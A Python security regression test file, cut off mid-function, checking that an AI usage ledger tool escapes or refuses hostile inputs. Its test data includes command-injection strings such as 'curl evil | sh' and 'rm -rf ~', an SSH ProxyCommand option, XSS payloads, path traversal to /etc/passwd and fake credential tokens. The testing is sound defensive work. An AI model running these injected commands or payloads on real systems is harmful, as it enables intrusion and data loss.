#!/usr/bin/env python3
"""
Security regression checks: operator-controlled values with shell syntax, HTML or control characters must stay
literal, and generated pages must not reach the network.

    python3 tests/test_security.py     # prints SECURITY OK on success

Covers the ClawHub audit findings for 1.5.0:
  1. report output directory with shell metacharacters -> no command runs, CSV is sorted (compile_ai_logs.py)
  2. SSH / WSL manifest fields with shell syntax -> refused before any ssh/wsl call (run_pipeline.py)
  3. scheduled wrapper: no free-form arguments, every word quoted, mode 0700 on POSIX (schedule.py)
  4. branding with markup, bad colours, remote logo, extra CSS -> escaped / dropped (build_dashboard.py, build_report.py)
  5. generated dashboard, study and documents carry a CSP and no http(s) resource references
Covers the audit findings for 1.5.4:
  9. an editable pipeline manifest is refused before it is read; a manifest-supplied interpreter for a
     local/share host must look like python and exist, so it cannot select an arbitrary executable
Covers the audit findings for 1.5.1:
  6. unattended onboarding stays neutral (no publisher identity); `run` without a config refuses; presets are explicit
  7. archive: '..' and absolute paths, hostile host names and escapes outside the root are refused; ssh archive
     validates the target and drops hostile paths before any ssh call; remote commands are fixed strings
  8. private files: ledger home 0700, config / store / index / map 0600 under a permissive umask (POSIX)
"""
import json
import os
import re
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SCRIPTS = os.path.join(ROOT, "scripts")
sys.path.insert(0, SCRIPTS)
sys.path.insert(0, HERE)
import safety  # noqa: E402
import schedule  # noqa: E402
import make_fixtures  # noqa: E402

OUT = os.path.join(HERE, "out", "security")
FX = os.path.join(HERE, "fixtures")
PY = sys.executable
EXTERNAL_REF = re.compile(r"""(?:src|href)\s*=\s*["']https?://""", re.IGNORECASE)


def run(cmd, **kw):
    return subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, encoding="utf-8", errors="replace", **kw)


def check_sort_injection():
    """--out-dir with $(...), backticks, quotes and spaces: the marker must not appear, the CSV must be sorted."""
    # no double quotes or colons: Windows cannot name a directory with them; $(), backticks, ; and spaces are enough
    weird = os.path.join(OUT, "out dir $(touch MARKER-INJECTED) `touch MARKER-INJECTED` ;x")
    os.makedirs(weird, exist_ok=True)
    markers = [os.path.join(d, "MARKER-INJECTED") for d in (ROOT, OUT, weird, os.getcwd())]
    scan = os.path.join(OUT, "scan")
    r = run([PY, os.path.join(SCRIPTS, "compile_ai_logs.py"), "scan", "--host", "fixture", "--out-dir", scan, "--claude-root", os.path.join(FX, "claude"),
             "--codex-root", os.path.join(FX, "codex"), "--aider-root", os.path.join(FX, "aider")])
    r2 = run([PY, os.path.join(SCRIPTS, "compile_ai_logs.py"), "report", "--events", os.path.join(scan, "events.fixture.jsonl"), "--pricing", os.path.join(ROOT, "templates", "pricing.json"), "--out-dir", weird])
    csvp = os.path.join(weird, "all_events.csv")
    rows = open(csvp, encoding="utf-8").read().splitlines() if os.path.isfile(csvp) else []
    ts = [ln.split(",", 1)[0] for ln in rows[1:]]
    created = any(os.path.exists(m) for m in markers)
    good = r.returncode == 0 and r2.returncode == 0 and not created and len(ts) == 6 and ts == sorted(ts)
    print("sort:      out-dir with $() and backticks -> marker %s, %d rows sorted %s  %s" % ("absent" if not created else "CREATED", len(ts), ts == sorted(ts), "OK" if good else "FAIL"))
    if not good:
        print(r.stderr[-500:], r2.stderr[-500:])
    return good


def check_manifest_validation():
    bad_hosts = [
        {"name": "s", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp; rm -rf ~"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "python": "python3; curl evil | sh"},
        {"name": "s", "kind": "ssh", "ssh": "-oProxyCommand=evil host"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp/../etc"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "python": "$(id)"},
    ]
    refused = 0
    for h in bad_hosts:
        try:
            safety.validate_ssh_host(h)
        except SystemExit:
            refused += 1
    ok_host = {"ssh": "completetrain@train.example.net", "remote_tmp": "/tmp/ai-usage-ledger", "python": "/usr/bin/python3"}
    accepted = safety.validate_ssh_host(ok_host) == ("completetrain@train.example.net", "/tmp/ai-usage-ledger", "/usr/bin/python3")
    wsl_refused = 0
    for h in ({"distro": "Ubuntu; evil"}, {"distro": "Ubuntu", "python": "python3 && evil"}):
        try:
            safety.validate_wsl_host(h)
        except SystemExit:
            wsl_refused += 1
    ctl = 0
    for v in ("C:\\x\ny", "/tmp/a\x00b", "-rf"):
        try:
            safety.check_path(v, "root")
        except SystemExit:
            ctl += 1
    # end to end: run_pipeline must refuse the manifest before touching ssh
    m = {"workdir": os.path.join(OUT, "pipe"), "hosts": [{"name": "evil", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp;touch /tmp/pwned"}]}
    mp = os.path.join(OUT, "evil-manifest.json")
    os.makedirs(os.path.dirname(mp), exist_ok=True)
    json.dump(m, open(mp, "w", encoding="utf-8"))
    r = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", mp, "--only", "scan"])
    e2e = r.returncode != 0 and "remote_tmp" in (r.stderr + r.stdout) and "ssh " not in r.stderr.split("remote_tmp")[0]
    good = refused == len(bad_hosts) and accepted and wsl_refused == 2 and ctl == 3 and e2e
    print("manifest:  %d/%d bad ssh hosts refused, good host accepted %s, wsl %d/2, control chars %d/3, pipeline refused before ssh %s  %s" % (refused, len(bad_hosts), accepted, wsl_refused, ctl, e2e, "OK" if good else "FAIL"))
    if not e2e:
        print(r.stderr[-400:])
    return good


def check_manifest_ownership():
    """A manifest picks interpreters, ssh targets and roots, so an editable one must stop the run outright."""
    base = os.path.join(OUT, "ownership")
    os.makedirs(base, exist_ok=True)
    canary = os.path.join(base, "pwned")
    # a manifest-supplied interpreter must not be an arbitrary executable
    refused = 0
    hostile = [{"python": "/bin/sh"}, {"python": "evil.sh"}, {"python": os.path.join(base, "evil")}, {"python": "-c"}]
    for h in hostile:
        try:
            safety.validate_local_python(h, PY)
        except SystemExit:
            refused += 1
    default_kept = safety.validate_local_python({}, PY) == PY
    interp = refused == len(hostile) and default_kept

    if os.name == "nt":
        perms = True
        note = "writable-manifest refusal skipped on Windows (POSIX modes are checked in CI)"
    else:
        m = {"workdir": os.path.join(base, "work"),
             "hosts": [{"name": "l", "kind": "local", "python": "/bin/sh", "claude_roots": [base]}]}
        mp = os.path.join(base, "shared-manifest.json")
        json.dump(m, open(mp, "w", encoding="utf-8"))
        os.chmod(mp, 0o666)
        env = dict(os.environ)
        env.pop("AI_USAGE_LEDGER_ALLOW_SHARED", None)
        r = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", mp, "--only", "scan"], env=env)
        perms = r.returncode != 0 and "pipeline manifest" in (r.stderr + r.stdout) and not os.path.exists(canary)
        note = "writable manifest refused %s" % perms

    good = interp and perms
    print("manifest own: %d/%d hostile interpreters refused, default kept %s, %s  %s" % (
        refused, len(hostile), default_kept, note, "OK" if good else "FAIL"))
    return good


def check_wrapper():
    home = os.path.join(OUT, "home with space $(touch pwned) `id`")
    os.makedirs(home, exist_ok=True)
    body = schedule.wrapper_body(home, PY, ["anonymize"])
    literal = "$(touch pwned)" in body and "--anonymize" in body
    if schedule.IS_WIN:
        quoted = '"%s"' % home in body or 'HOME=%s"' % home in body  # batch: inside double quotes; $() is literal in cmd.exe
        no_shell_eval = True
    else:
        quoted = "'" in body and "'%s'" % home.replace("'", "'\"'\"'") in body or shutil.which("sh") is None
        no_shell_eval = True
    # the CLI no longer accepts free-form arguments
    r = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--extra-args", "--x", "--dry-run"])
    no_extra = r.returncode != 0 and "extra-args" in (r.stderr + r.stdout)
    r2 = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--frequency", "daily", "--time", "03:00", "--anonymize", "--dry-run"])
    dry = r2.returncode == 3 and "wrapper" in r2.stdout and "Not installed" in r2.stdout and not os.path.exists(os.path.join(OUT, "pwned"))
    mode_ok = True
    if not schedule.IS_WIN:
        p = schedule.write_wrapper(home, PY, ["anonymize"])
        mode_ok = (os.stat(p).st_mode & 0o777) == 0o700
    bad_time = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--time", "3pm; evil", "--dry-run"]).returncode != 0
    good = literal and quoted and no_shell_eval and no_extra and dry and mode_ok and bad_time
    print("wrapper:   metacharacters literal %s, quoted %s, --extra-args gone %s, dry-run shows body %s, mode 0700 %s, bad time refused %s  %s" % (literal, quoted, no_extra, dry, mode_ok, bad_time, "OK" if good else "FAIL"))
    if not good:
        print(body)
    return good


def check_branding_and_pages(compiled):
    evil = {"branding": {
        "name": '<script>alert(1)</script>', "eyebrow": '"><img src=x onerror=alert(2)>', "tagline": "Tag & <b>line</b>", "contact": "a@b.c",
        "footer": "</div><script>alert(3)</script>", "accent": "red;}body{display:none}", "logo": "https://evil.example/logo.png",
        "extra_css": "</style><script>alert(4)</script>", "google_fonts_url": "https://evil.example/x.css",
        "light": {"bg": "#fff", "ink": "url(javascript:alert(5))", "bad name!": "#000"}, "font_body": "Arial, sans-serif",
    }, "dashboard_title": "<script>t</script>", "html_title": "</title><script>u</script>", "theme_default": "<x>"}
    cfgp = os.path.join(OUT, "evil-config.json")
    json.dump(evil, open(cfgp, "w", encoding="utf-8"))
    dash = os.path.join(OUT, "evil-dashboard.html")
    r = run([PY, os.path.join(SCRIPTS, "build_dashboard.py"), os.path.join(compiled, "summary.json"), dash, cfgp])
    pkg = os.path.join(OUT, "evil-report")
    r2 = run([PY, os.path.join(SCRIPTS, "build_report.py"), "--compiled", compiled, "--scans", os.path.join(ROOT, "tests", "out", "pipeline", "scans"), "--pricing", os.path.join(ROOT, "templates", "pricing.json"), "--out", pkg, "--date", "2026-09-09", "--tz", "UTC", "--config", cfgp])
    results = []
    for label, path in (("dashboard", dash), ("study", os.path.join(pkg, "report.html"))):
        if not os.path.isfile(path):
            results.append((label, False, "missing"))
            continue
        h = open(path, encoding="utf-8").read()
        injected = [s for s in ("display:none}", "evil.example", "javascript:", "<script>t</script>", "<script>u</script>") if s in h]
        # alert(1) etc. may appear only in escaped form
        raw_script = re.search(r"<script>alert\(\d\)</script>", h) is not None
        raw_img = re.search(r"<img\s+src=x\s+onerror", h) is not None  # the escaped text may still contain the words; a live tag may not
        ext = EXTERNAL_REF.search(h) is not None or "fonts.googleapis" in h
        csp = "Content-Security-Policy" in h
        escaped_ok = "&lt;script&gt;alert(1)&lt;/script&gt;" in h
        good = not raw_script and not raw_img and "display:none}" not in h and "evil.example" not in h and "javascript:" not in h and not ext and csp and escaped_ok and "<script>t</script>" not in h and "<script>u</script>" not in h
        results.append((label, good, "raw_script=%s ext=%s csp=%s escaped=%s leftovers=%s" % (raw_script, ext, csp, escaped_ok, injected[:3])))
    good = all(g for _, g, _ in results) and r.returncode == 0 and r2.returncode == 0
    print("branding:  " + "; ".join("%s %s (%s)" % (lb, "ok" if g else "FAIL", d) for lb, g, d in results) + "  %s" % ("OK" if good else "FAIL"))
    if r.returncode or r2.returncode:
        print(r.stderr[-400:], r2.stderr[-400:])
    return good


def check_persistence_consent():
    """Persistence can never come from configuration alone: onboarding does not install, install needs a matching consent."""
    import tempfile
    home = tempfile.mkdtemp(prefix="ledger-sched-")
    env = dict(os.environ, AI_USAGE_LEDGER_HOME=home)
    ledger = os.path.join(SCRIPTS, "ledger.py")
    r1 = run([PY, ledger, "init", "--yes", "--set", "detect.wsl=n", "--set", "detect.all_profiles=n", "--set", "schedule.frequency=daily", "--set", "schedule.time=04:30", "--set", "schedule.install=y"], env=env)
    onboarding_safe = r1.returncode == 0 and "Nothing was registered" in r1.stdout and "ignored" in r1.stderr and not os.path.exists(os.path.join(home, "schedule-consent.json")) and not os.path.exists(os.path.join(home, "run-ledger.cmd")) and not os.path.exists(os.path.join(home, "run-ledger.sh"))
    r2 = run([PY, ledger, "schedule", "install", "--dry-run"], env=env)  # no terminal, no consent
    refused = r2.returncode == 3 and "Not installed" in r2.stdout and "The scheduled entry will run" in r2.stdout and "schedule remove" in r2.stdout and ("schtasks" not in r2.stdout and "crontab line" not in r2.stdout)
    # a consent for a different configuration is rejected
    json.dump({"approved_by": "test", "approved_at": "2026-01-01T00:00:00+00:00", "config_hash": "0000000000000000", "sensitive_acknowledged": False}, open(os.path.join(home, "schedule-consent.json"), "w", encoding="utf-8"))
    r3 = run([PY, ledger, "schedule", "install", "--dry-run"], env=env)
    stale = r3.returncode == 3 and "changed since consent" in r3.stdout
    # the consent printed by `schedule consent`, written by the operator, is accepted
    c = run([PY, ledger, "schedule", "consent"], env=env)
    rec = json.loads(c.stdout[c.stdout.rfind("{"):c.stdout.rfind("}") + 1])
    rec["approved_by"] = "test"
    json.dump(rec, open(os.path.join(home, "schedule-consent.json"), "w", encoding="utf-8"))
    r4 = run([PY, ledger, "schedule", "install", "--dry-run"], env=env)
    accepted = r4.returncode == 0 and "consent: consented" in r4.stdout and ("schtasks" in r4.stdout or "crontab line" in r4.stdout) and "04:30" in r4.stdout
    # high-impact schedule (raw-log archive) needs the separate acknowledgement
    run([PY, ledger, "init", "--yes", "--set", "archive.raw_logs=y"], env=env)
    r5 = run([PY, ledger, "schedule", "install", "--dry-run"], env=env)
    sensitive_refused = r5.returncode == 3 and ("changed since consent" in r5.stdout or "high-impact" in r5.stdout) and "HIGH-IMPACT" in r5.stdout
    c2 = run([PY, ledger, "schedule", "consent"], env=env)
    rec2 = json.loads(c2.stdout[c2.stdout.rfind("{"):c2.stdout.rfind("}") + 1])
    rec2["approved_by"] = "test"
    rec2["sensitive_acknowledged"] = False
    json.dump(rec2, open(os.path.join(home, "schedule-consent.json"), "w", encoding="utf-8"))
    r6 = run([PY, ledger, "schedule", "install", "--dry-run"], env=env)
    unacked = r6.returncode == 3 and "did not acknowledge" in r6.stdout
    rec2["sensitive_acknowledged"] = True
    json.dump(rec2, open(os.path.join(home, "schedule-consent.json"), "w", encoding="utf-8"))
    r7 = run([PY, ledger, "schedule", "install", "--dry-run", "--expires", "2099-12-31"], env=env)
    # a different expiry changes the material configuration, so it must be re-consented; the same one passes
    expiry_changes = r7.returncode == 3 and "changed since consent" in r7.stdout
    r8 = run([PY, ledger, "schedule", "install", "--dry-run"], env=env)
    acked = r8.returncode == 0 and "--archive" in r8.stdout
    # a scheduled run is pinned to the consented configuration: the wrapper passes --scheduled, and a manifest that
    # changed since consent (a new host appeared) is refused before anything is scanned
    m = json.load(open(os.path.join(home, "manifest.json"), encoding="utf-8"))
    m["hosts"].append({"name": "surprise", "kind": "local", "codex_roots": ["/nowhere/.codex"]})
    json.dump(m, open(os.path.join(home, "manifest.json"), "w", encoding="utf-8"))
    r10 = run([PY, ledger, "run", "--scheduled", "--archive"], env=env)  # --archive is the consented flag at this point
    pinned = r10.returncode != 0 and "scheduled run refused" in (r10.stderr + r10.stdout) and "changed since consent" in (r10.stderr + r10.stdout)
    # an edited wrapper passing a one-shot option or an unconsented flag is refused before anything runs
    r11 = run([PY, ledger, "run", "--scheduled", "--archive", "--no-scan"], env=env)
    r12 = run([PY, ledger, "run", "--scheduled", "--archive", "--anonymize"], env=env)  # anonymize was never consented
    pinned = pinned and r11.returncode != 0 and "one-shot" in (r11.stderr + r11.stdout) and r12.returncode != 0 and ("flags" in (r12.stderr + r12.stdout) or "one-shot" in (r12.stderr + r12.stdout))
    # any manifest field counts, not only hosts: flipping package_accounts invalidates the consent
    m2 = json.load(open(os.path.join(home, "manifest.json"), encoding="utf-8"))
    m2["hosts"] = m2["hosts"][:-1]
    m2["package_accounts"] = True
    json.dump(m2, open(os.path.join(home, "manifest.json"), "w", encoding="utf-8"))
    r13 = run([PY, ledger, "run", "--scheduled", "--archive"], env=env)
    pinned = pinned and r13.returncode != 0 and "changed since consent" in (r13.stderr + r13.stdout)
    # no scheduler binary: nothing is written or recorded
    r14 = run([PY, ledger, "schedule", "install", "--dry-run"], env=dict(env, PATH=""))
    no_scheduler = r14.returncode == 4 and "not available" in r14.stdout
    pinned = pinned and no_scheduler
    wrapper_flag = "--scheduled" in schedule.wrapper_body(home, PY, ["anonymize"])
    # an expired scheduled run does nothing and never touches a scheduler entry it did not consent to
    os.remove(os.path.join(home, "schedule-consent.json"))
    r9 = run([PY, ledger, "run", "--until", "2000-01-01"], env=env)
    expired = r9.returncode == 0 and "expired" in r9.stdout and "nothing to do" in r9.stdout
    good = onboarding_safe and refused and stale and accepted and sensitive_refused and unacked and expiry_changes and acked and expired and pinned and wrapper_flag
    print("persistence: onboarding never installs %s, no-consent refused %s, stale consent refused %s, matching consent accepted %s, high-impact refused %s / unacknowledged %s / acknowledged %s, expiry re-consent %s, expired run inert %s, scheduled run pinned to consent %s  %s" % (
        onboarding_safe, refused, stale, accepted, sensitive_refused, unacked, acked, expiry_changes, expired, pinned and wrapper_flag, "OK" if good else "FAIL"))
    if not good:
        print(r1.stdout[-300:], r1.stderr[-200:], r2.stdout[-300:], r3.stdout[-200:], r4.stdout[-300:], r5.stdout[-200:], r6.stdout[-200:], r7.stdout[-200:], r8.stdout[-200:], r9.stdout[-200:], r10.stdout[-300:], r10.stderr[-300:])
    shutil.rmtree(home, ignore_errors=True)
    return good


def check_credential_minimisation():
    """Credential files are read only on request, identity is minimised by default, and publish-check finds leaks."""
    import tempfile
    import detect_hosts
    home = tempfile.mkdtemp(prefix="ledger-cred-")
    env = dict(os.environ, AI_USAGE_LEDGER_HOME=home)
    ledger = os.path.join(SCRIPTS, "ledger.py")
    r1 = run([PY, ledger, "init", "--yes", "--set", "detect.wsl=n", "--set", "detect.all_profiles=n"], env=env)
    acc = json.load(open(os.path.join(home, "accounts.json"), encoding="utf-8"))
    blob = json.dumps(acc)
    default_ok = r1.returncode == 0 and "Reading credential files" not in r1.stderr and "@" not in blob and acc.get("_sensitivity") == "placeholders" and "auth.json (last_refresh" not in blob
    # a legacy (pre-preference) accounts.json is redrafted on the next init even when the defaults are accepted
    legacy = os.path.join(home, "accounts.json")
    json.dump({"accounts": {"codex:legacy": {"label": "legacy@corp.example", "emails": ["legacy@corp.example"], "plan": "ChatGPT Pro", "monthly_usd": 200}}, "rules": []}, open(legacy, "w", encoding="utf-8"))
    cfgp = os.path.join(home, "config.json")
    c0 = json.load(open(cfgp, encoding="utf-8"))
    c0.pop("accounts", None)  # a 1.5.4 config had no accounts mapping
    json.dump(c0, open(cfgp, "w", encoding="utf-8"))
    rl = run([PY, ledger, "init", "--yes"], env=env)
    accl = json.load(open(legacy, encoding="utf-8"))
    legacy_redrafted = rl.returncode == 0 and "redrafted" in rl.stdout and "legacy@corp.example" not in json.dumps(accl) and any(f.startswith("accounts.json.before-") for f in os.listdir(home))
    default_ok = default_ok and legacy_redrafted
    # opt in, minimised: a warning names the files, and no e-mail or organisation title is retained
    r2 = run([PY, ledger, "init", "--yes", "--set", "accounts.from_credentials=y", "--set", "accounts.identifiable=n"], env=env)
    acc2 = json.load(open(os.path.join(home, "accounts.json"), encoding="utf-8"))
    blob2 = json.dumps(acc2)
    warned = "Reading credential files" in r2.stderr and "minimised" in r2.stderr
    minimised = r2.returncode == 0 and "@" not in blob2 and all(not v.get("emails") and not v.get("orgs") for v in acc2["accounts"].values())
    # a synthetic credential file proves the extraction keeps only the claims, and only the identifiable ones on request
    fake_root = os.path.join(home, "fakecodex")
    os.makedirs(fake_root, exist_ok=True)
    import base64
    claims = {"https://api.openai.com/auth": {"chatgpt_account_id": "abcdef1234567890", "chatgpt_plan_type": "pro", "organizations": [{"title": "Secret Org"}]}, "https://api.openai.com/profile": {"email": "person@corp.example"}}
    tok = "h." + base64.urlsafe_b64encode(json.dumps(claims).encode()).decode().rstrip("=") + ".s"
    json.dump({"tokens": {"id_token": tok, "access_token": "SECRET-ACCESS", "refresh_token": "SECRET-REFRESH"}, "last_refresh": "2026-09-01T00:00:00Z"}, open(os.path.join(fake_root, "auth.json"), "w", encoding="utf-8"))
    a_min = detect_hosts.read_codex_account(fake_root, identifiable=False)
    a_id = detect_hosts.read_codex_account(fake_root, identifiable=True)
    extract_ok = (a_min and a_min["id"] == "codex:abcdef12" and a_min["plan"] == "ChatGPT Pro" and not a_min["emails"] and not a_min["orgs"] and "SECRET" not in json.dumps(a_min)
                  and a_id and a_id["emails"] == ["person@corp.example"] and a_id["orgs"] == ["Secret Org"] and "SECRET" not in json.dumps(a_id))
    # publish-check: an identifiable accounts file and a package mentioning its e-mail are caught; the anonymised fixture output is not
    pkg = os.path.join(home, "pkg")
    os.makedirs(pkg, exist_ok=True)
    open(os.path.join(pkg, "USAGE_REPORT.md"), "w", encoding="utf-8").write("Report for person@corp.example (account abcdef12, Secret Org) on host lighthouse, see /home/alice/.codex/auth.json\n")
    open(os.path.join(pkg, "notes.json"), "w", encoding="utf-8").write('{"access_token": "SECRET-ACCESS-VALUE"}\n')
    import zipfile
    with zipfile.ZipFile(os.path.join(home, "pkg.zip"), "w") as z:
        z.write(os.path.join(pkg, "USAGE_REPORT.md"), "pkg/USAGE_REPORT.md")
    json.dump({"accounts": {"codex:abcdef12": a_id}, "rules": []}, open(os.path.join(home, "accounts.json"), "w", encoding="utf-8"))
    r3 = run([PY, ledger, "publish-check", pkg], env=env)
    caught = (r3.returncode == 1 and "e-mail address" in r3.stdout and "credential file path" in r3.stdout and "secret-bearing key" in r3.stdout and "SECRET-ACCESS-VALUE" not in r3.stdout
              and ("organisation name" in r3.stdout or "account id prefix" in r3.stdout or "account key" in r3.stdout))
    rz = run([PY, ledger, "publish-check", os.path.join(home, "pkg.zip")], env=env)
    caught = caught and rz.returncode == 1 and "e-mail address" in rz.stdout
    # a DOCX is read through its XML parts, so an e-mail inside a document is found
    with zipfile.ZipFile(os.path.join(home, "doc.docx"), "w") as z:  # the e-mail is split across two runs, as Word does
        z.writestr("word/document.xml", '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Prepared for person@</w:t></w:r><w:r><w:t>corp.example</w:t></w:r></w:p></w:body></w:document>')
    rd = run([PY, ledger, "publish-check", os.path.join(home, "doc.docx")], env=env)
    caught = caught and rd.returncode == 1 and "e-mail address" in rd.stdout
    # an image-only PDF (no extractable text) is unscannable, never approved
    try:
        import pypdf
        w = pypdf.PdfWriter()
        w.add_blank_page(width=200, height=200)
        with open(os.path.join(home, "scan.pdf"), "wb") as fh:
            w.write(fh)
        rp = run([PY, ledger, "publish-check", os.path.join(home, "scan.pdf")], env=env)
        caught = caught and rp.returncode == 1 and "unscannable" in rp.stdout
    except ImportError:
        pass
    # placeholders never claim a subscription
    ph = json.loads(run([PY, os.path.join(SCRIPTS, "detect_hosts.py"), "--json", "--no-wsl"], env=env).stdout)["accounts"]
    placeholder_billing = all(r.get("billing") == "unknown" for r in ph["rules"] if "placeholder" in (r.get("why") or "")) and ph.get("_source") == "host placeholders"
    caught = caught and placeholder_billing
    # a 1.5.6-style accounts file (has _sensitivity, no _source) is described from its sensitivity, never as credential-derived
    import compile_ai_logs
    inferred = (compile_ai_logs.account_source({"_sensitivity": "placeholders", "accounts": {}}) == "host placeholders"
                and compile_ai_logs.account_source({"_sensitivity": "account metadata", "accounts": {}}) == "credential files"
                and compile_ai_logs.account_source({"accounts": {"x": {"label": "x"}}}) == "unspecified")
    import anonymize
    an_src = anonymize.Anonymizer("s").accounts({"_sensitivity": "placeholders", "accounts": {}, "rules": []}).get("_source") == "host placeholders"
    caught = caught and inferred and an_src
    clean_dir = os.path.join(home, "clean")
    os.makedirs(clean_dir, exist_ok=True)
    open(os.path.join(clean_dir, "USAGE_REPORT.md"), "w", encoding="utf-8").write("host-1a2b3c: 1,510 calls, example@example.com placeholder only. Claude Code keeps its login in `.claude.json`; auth.json is never copied.\n")
    r4 = run([PY, ledger, "publish-check", clean_dir], env=env)
    clean = r4.returncode == 0
    good = default_ok and warned and minimised and extract_ok and caught and clean
    print("credentials: default init reads none %s, opt-in warns %s, minimised (no e-mail/org) %s, claim extraction %s, publish-check catches %s / passes clean %s  %s" % (
        default_ok, warned, minimised, extract_ok, caught, clean, "OK" if good else "FAIL"))
    if not good:
        print(r1.stderr[-300:], r2.stderr[-400:], r3.stdout[-400:], r4.stdout[-200:])
    shutil.rmtree(home, ignore_errors=True)
    return good


def check_neutral_branding():
    import tempfile
    home = tempfile.mkdtemp(prefix="ledger-neutral-")
    env = dict(os.environ, AI_USAGE_LEDGER_HOME=home)
    ledger = os.path.join(SCRIPTS, "ledger.py")
    r0 = run([PY, ledger, "run", "--no-detect"], env=env)  # no config yet: must refuse, not onboard-and-scan
    refused = r0.returncode != 0 and "init" in (r0.stderr + r0.stdout) and not os.path.exists(os.path.join(home, "config.json"))
    r1 = run([PY, ledger, "init", "--yes", "--set", "detect.wsl=n", "--set", "detect.all_profiles=n"], env=env)
    cfg = json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))
    rc = json.load(open(cfg["report_config_path"], encoding="utf-8"))
    blob = json.dumps(cfg["branding"]) + json.dumps(rc["branding"])
    neutral = r1.returncode == 0 and not cfg["branding"].get("explicit") and all(s not in blob for s in ("CompleteTech", "complete.tech", "@", "Innovation")) and "Unbranded" in json.dumps(rc["branding"])
    r2 = run([PY, ledger, "init", "--yes", "--brand-preset", "completetech"], env=env)
    cfg2 = json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))
    preset = r2.returncode == 0 and cfg2["branding"].get("name") == "CompleteTech" and cfg2["branding"].get("explicit") is True and cfg2["branding"].get("preset") == "completetech"
    r3 = run([PY, ledger, "init", "--yes", "--set", "brand.preset=none", "--set", "brand.name=Acme"], env=env)
    cfg3 = json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))
    explicit = r3.returncode == 0 and cfg3["branding"].get("name") == "Acme" and cfg3["branding"].get("explicit") is True and "CompleteTech" not in json.dumps(cfg3["branding"])
    bad_preset = run([PY, ledger, "init", "--yes", "--brand-preset", "nosuch"], env=env).returncode != 0
    good = refused and neutral and preset and explicit and bad_preset
    print("branding-default: run-without-config refused %s, unattended init neutral %s, explicit preset %s, explicit --set %s, unknown preset refused %s  %s" % (refused, neutral, preset, explicit, bad_preset, "OK" if good else "FAIL"))
    if not good:
        print(r0.stderr[-300:], r1.stderr[-300:], r2.stderr[-300:], blob[:300])
    shutil.rmtree(home, ignore_errors=True)
    return good


def check_archive_boundaries():
    import ledger_archive
    refused = 0
    for p in ("/a/../../etc/passwd", "../x", "C:/Users/x/../../../Windows/evil"):
        try:
            ledger_archive.rel_path(p)
        except SystemExit:
            refused += 1
    ok_rel = ledger_archive.rel_path("C:\\Users\\x\\.codex\\s.jsonl") == "C/Users/x/.codex/s.jsonl" and ledger_archive.rel_path("//wsl$/Ubuntu/home/u/.claude/a.jsonl") == "home/u/.claude/a.jsonl"
    arch = ledger_archive.Archive(os.path.join(OUT, "arch"))
    bad_host = 0
    for h in ("../evil", "h/../..", "a b", "-x", ""):
        try:
            arch.dest_for(h, "/a/b")
        except SystemExit:
            bad_host += 1
    src_refused = 0
    for p in ("/a\nb", "relative/path", "-rf", "/x/../../etc", "/a\x00b"):
        try:
            safety.check_source_path(p)
        except SystemExit:
            src_refused += 1
    dest, _ = arch._checked_dest("host-1", "/home/u/.codex/x.jsonl")
    inside = safety.contained(arch.path, dest)
    # ssh archive: the target is validated and hostile paths dropped before any ssh process starts
    import subprocess as sp
    calls = []
    real_run, real_popen = sp.run, sp.Popen

    def spy(*a, **k):
        calls.append(a[0])
        raise RuntimeError("ssh must not be called")
    sp.run, sp.Popen = spy, spy
    try:
        try:
            arch.archive_ssh("h", {"ssh": "-oProxyCommand=evil host"}, ["/srv/x.jsonl"])
            target_refused = False
        except SystemExit:
            target_refused = True
        res = arch.archive_ssh("h", {"ssh": "user@host"}, ["/srv/a\nb.jsonl", "relative.jsonl", "/srv/../etc/passwd"])
        hostile_dropped = res == (0, 0, 0) and not calls
    finally:
        sp.run, sp.Popen = real_run, real_popen
    fixed_cmds = "xargs -0" in ledger_archive.Archive.REMOTE_STAT and "--null" in ledger_archive.Archive.REMOTE_TAR
    arch.close()
    good = refused == 3 and ok_rel and bad_host == 5 and src_refused == 5 and inside and target_refused and hostile_dropped and fixed_cmds
    print("archive:   traversal refused %d/3, host names refused %d/5, source paths refused %d/5, destination contained %s, ssh target refused %s, hostile paths dropped before ssh %s, fixed remote commands %s  %s" % (
        refused, bad_host, src_refused, inside, target_refused, hostile_dropped, fixed_cmds, "OK" if good else "FAIL"))
    return good


def check_private_permissions():
    if os.name == "nt":
        print("perms:     skipped on Windows (NTFS profile ACLs; POSIX modes are checked in CI)  OK")
        return True
    import tempfile
    import anonymize
    import ledger_store
    import ledger_archive
    old = os.umask(0o022)
    try:
        home = tempfile.mkdtemp(prefix="ledger-perm-")
        os.chmod(home, 0o755)
        env = dict(os.environ, AI_USAGE_LEDGER_HOME=home)
        run([PY, os.path.join(SCRIPTS, "ledger.py"), "init", "--yes", "--set", "detect.wsl=n", "--set", "detect.all_profiles=n"], env=env)
        modes = {"home": os.stat(home).st_mode & 0o777, "config": os.stat(os.path.join(home, "config.json")).st_mode & 0o777,
                 "accounts": os.stat(os.path.join(home, "accounts.json")).st_mode & 0o777, "manifest": os.stat(os.path.join(home, "manifest.json")).st_mode & 0o777}
        st = ledger_store.Store.open("sqlite", os.path.join(home, "s.sqlite"))
        st.set_pref("k", 1)
        st.close()
        modes["sqlite"] = os.stat(os.path.join(home, "s.sqlite")).st_mode & 0o777
        fs = ledger_store.Store.open("json", os.path.join(home, "j"))
        fs.set_pref("k", 1)
        fs.close()
        modes["json-dir"] = os.stat(os.path.join(home, "j")).st_mode & 0o777
        modes["prefs"] = os.stat(os.path.join(home, "j", "prefs.json")).st_mode & 0o777
        ar = ledger_archive.Archive(os.path.join(home, "archive"))
        ar.close()
